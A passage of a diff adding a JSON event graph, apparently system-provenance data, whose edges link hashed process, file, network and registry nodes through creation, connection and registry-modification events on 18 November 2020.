+      "target": "File:cf4823156f983eec",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:15.374028000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28F-5FB4-0000-00104CB30600}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:15.336927000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28F-5FB4-0000-001074B00600}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:15.331623100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F28F-5FB4-0000-00100DC00600}",
+      "target": "Process:{31314CAD-F290-5FB4-0000-0010ABD70600}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:16.391413500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F290-5FB4-0000-0010ABD70600}",
+      "target": "File:be5ba3d3026493bf",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:17.264360000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F290-5FB4-0000-0010ABD70600}",
+      "target": "Network:8fb93a8279883392",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:18.885771500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F290-5FB4-0000-0010ABD70600}",
+      "target": "Network:08faff18e7f0dae9",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:18.885715200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F292-5FB4-0000-001003090700}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:18.516099000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F292-5FB4-0000-001003090700}",
+      "target": "File:6a353e0accc2d981",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:18.425143500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F292-5FB4-0000-001036080700}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:18.387332100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F292-5FB4-0000-001070050700}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:18.382101800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F292-5FB4-0000-0010F1140700}",
+      "target": "Process:{31314CAD-F293-5FB4-0000-0010912C0700}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:19.419208300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F293-5FB4-0000-0010912C0700}",
+      "target": "Network:ad563bf11f43fb38",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:19.419208300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F293-5FB4-0000-0010912C0700}",
+      "target": "File:4dad6c8068149133",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:20.132937900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F293-5FB4-0000-0010912C0700}",
+      "target": "File:6a51935ba2b25c52",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:21.481832900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F296-5FB4-0000-0010B0680700}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:22.453169400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F296-5FB4-0000-0010B0680700}",
+      "target": "File:b986bdd7a9bea2a3",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:22.363870800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F296-5FB4-0000-0010F1670700}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:22.325873000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F296-5FB4-0000-00101B650700}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:22.320362600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F293-5FB4-0000-0010912C0700}",
+      "target": "Network:8fb93a8279883392",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:22.009024000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F293-5FB4-0000-0010912C0700}",
+      "target": "Network:08faff18e7f0dae9",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:22.008989200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F296-5FB4-0000-001087740700}",
+      "target": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:23.352420100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "target": "Network:798dc1fb3e3498f1",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:23.352420100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "target": "File:851159dcd3942042",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:25.946939800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "target": "Network:8d3c0e76a4d3e171",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:25.678937100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "target": "Network:2a4437867ef08887",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:26.725262100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "target": "Network:04d1a7cf9bf3e76d",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:26.725227700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "target": "Network:8fb93a8279883392",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:28.568146700Z",
+      "access_count": 2,
+      "last_timestamp": "2020-11-18T10:08:43.121969900Z"
+    },
+    {
+      "source": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "target": "Network:08faff18e7f0dae9",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:28.568117700Z",
+      "access_count": 4,
+      "last_timestamp": "2020-11-18T10:08:33.721440900Z"
+    },
+    {
+      "source": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "target": "Network:22060179e5cfc182",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-18T10:08:30.613950500Z",
+      "access_count": 7,
+      "last_timestamp": "2020-11-18T10:08:37.875132200Z"
+    },
+    {
+      "source": "Process:{31314CAD-F297-5FB4-0000-00101A8C0700}",
+      "target": "File:c06b24e54c54040a",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:41.090840600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2AE-5FB4-0000-0010C94D0800}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:46.974739900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2AE-5FB4-0000-00106C4A0800}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:46.969263800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2AE-5FB4-0000-00108C4E0800}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:47.103765500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2AE-5FB4-0000-00108C4E0800}",
+      "target": "File:73ace0acba849ab9",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:47.013091700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2AF-5FB4-0000-0010E35A0800}",
+      "target": "Process:{31314CAD-F2B0-5FB4-0000-00102B830800}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:48.055922200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B2-5FB4-0000-00104AB90800}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:50.217537100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B2-5FB4-0000-00104AB90800}",
+      "target": "File:c160170fd3e3a251",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:50.125915500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B2-5FB4-0000-00107DB80800}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:50.088281200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B2-5FB4-0000-0010B9B50800}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:50.082926100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B2-5FB4-0000-001015C50800}",
+      "target": "Process:{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:51.129016900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-0010CB440900}",
+      "target": "Process:{31314CAD-F2B4-5FB4-0000-001075480900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:52.805600200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-0010CB440900}",
+      "target": "Process:{31314CAD-F2B4-5FB4-0000-00107C460900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:52.782002200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-0010CB440900}",
+      "target": "Process:{31314CAD-F2B4-5FB4-0000-001097450900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:52.776039500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+      "target": "Process:{31314CAD-F2B4-5FB4-0000-0010CB440900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:52.770167800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-001059260900}",
+      "target": "Process:{31314CAD-F2B4-5FB4-0000-001044420900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:52.737819100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-001059260900}",
+      "target": "Registry:7c56aa38aae4a569",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:08:52.714745800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-001059260900}",
+      "target": "File:8e9b39a0a2808555",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:52.477273100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+      "target": "Process:{31314CAD-F2B4-5FB4-0000-001059260900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:52.437388300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-0010891B0900}",
+      "target": "Process:{31314CAD-F2B4-5FB4-0000-0010D7240900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:52.377850600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-0010F1190900}",
+      "target": "Process:{31314CAD-F2B4-5FB4-0000-0010891B0900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:52.289089700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-0010F1190900}",
+      "target": "Process:{31314CAD-F2B4-5FB4-0000-0010A41A0900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:52.282784300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+      "target": "Process:{31314CAD-F2B4-5FB4-0000-0010F1190900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:52.277099700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+      "target": "Process:{31314CAD-F2B5-5FB4-0000-001053970900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:53.785305500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+      "target": "Process:{31314CAD-F2B5-5FB4-0000-00107B950900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:53.765597700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B5-5FB4-0000-001059740900}",
+      "target": "Process:{31314CAD-F2B5-5FB4-0000-001046910900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:53.729465300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B5-5FB4-0000-001059740900}",
+      "target": "Registry:de25fc368edaea59",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:08:53.685195900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B5-5FB4-0000-001059740900}",
+      "target": "Registry:2b8e70f90887861e",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:08:53.677936500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B5-5FB4-0000-001059740900}",
+      "target": "File:328d7454674b64f3",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:53.446470700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+      "target": "Process:{31314CAD-F2B5-5FB4-0000-001059740900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:53.408718500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B5-5FB4-0000-0010516E0900}",
+      "target": "Process:{31314CAD-F2B5-5FB4-0000-001022740900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:53.406753500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B5-5FB4-0000-0010E2540900}",
+      "target": "Process:{31314CAD-F2B5-5FB4-0000-0010516E0900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:53.374240300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B5-5FB4-0000-0010E2540900}",
+      "target": "Registry:de25fc368edaea59",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:08:53.358241100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B5-5FB4-0000-0010E2540900}",
+      "target": "Registry:2b8e70f90887861e",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:08:53.350955000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B5-5FB4-0000-0010E2540900}",
+      "target": "File:bfae59c9e19f3f72",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:53.115807200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+      "target": "Process:{31314CAD-F2B5-5FB4-0000-0010E2540900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:53.078381400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-001075480900}",
+      "target": "Process:{31314CAD-F2B5-5FB4-0000-001022740900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:53.057114800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B5-5FB4-0000-001053970900}",
+      "target": "Registry:00b679520cb46e5a",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:08:54.071350500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B3-5FB4-0000-00105AE30800}",
+      "target": "Process:{31314CAD-F2B9-5FB4-0000-001032E50900}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:57.224857000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BB-5FB4-0000-001070020A00}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-0010F7A01000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:59.143535600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BB-5FB4-0000-001070020A00}",
+      "target": "File:c524a4c5e5a275ec",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:08:59.052812900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BB-5FB4-0000-0010A3010A00}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-00103B951000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:59.015549600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BA-5FB4-0000-0010B0FE0900}",
+      "target": "Process:{31314CAD-F205-5FB4-0000-001082941000}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:08:59.010468800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BB-5FB4-0000-00107B100A00}",
+      "target": "Process:{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:09:00.423314000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F22D-5FB4-0000-001029530000}",
+      "target": "Registry:80e3c3ba984a7193",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:09:00.202341400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F22D-5FB4-0000-001029530000}",
+      "target": "Registry:e77c86c0aea284c5",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:09:00.202054300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+      "target": "Process:{31314CAD-F2BD-5FB4-0000-0010A9690A00}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:09:01.867916200Z",
+      "access_count": 2,
+      "last_timestamp": "2020-11-18T10:09:02.086519000Z"
+    },
+    {
+      "source": "Process:{31314CAD-F2BD-5FB4-0000-0010A6670A00}",
+      "target": "Process:{31314CAD-F2BD-5FB4-0000-001072680A00}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:09:01.854122600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+      "target": "Process:{31314CAD-F2BD-5FB4-0000-0010A6670A00}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:09:01.848261800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+      "target": "Process:{31314CAD-F2BD-5FB4-0000-0010FC580A00}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:09:01.629290400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BD-5FB4-0000-00101C560A00}",
+      "target": "Process:{31314CAD-F2BD-5FB4-0000-001083570A00}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:09:01.607633800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+      "target": "Process:{31314CAD-F2BD-5FB4-0000-00101C560A00}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:09:01.601504100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+      "target": "File:8d6920bd73239a4c",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-18T10:09:01.034676900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+      "target": "Process:{31314CAD-F2BE-5FB4-0000-0010A6980A00}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:09:02.525109000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+      "target": "Process:{31314CAD-F2BE-5FB4-0000-0010E6890A00}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:09:02.314056400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BC-5FB4-0000-00104D310A00}",
+      "target": "Process:{31314CAD-F2BE-5FB4-0000-0010CE880A00}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-18T10:09:02.299489700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-00107C460900}",
+      "target": "Registry:4431ab4887e7c90d",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:08:52.782002200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-001097450900}",
+      "target": "Registry:4431ab4887e7c90d",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:08:52.776039500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2B4-5FB4-0000-0010A41A0900}",
+      "target": "Registry:54a5f4d883280660",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-18T10:08:52.282784300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BD-5FB4-0000-001072680A00}",
+      "target": "Registry:3ef43181fb09b957",
+      "relation": "DELETE_REGISTRY",
+      "timestamp": "2020-11-18T10:09:01.854122600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{31314CAD-F2BD-5FB4-0000-001083570A00}",
+      "target": "Registry:b2a081892075caa7",
+      "relation": "DELETE_REGISTRY",
+      "timestamp": "2020-11-18T10:09:01.607633800Z",
+      "access_count": 1
+    }
+  ]
+}
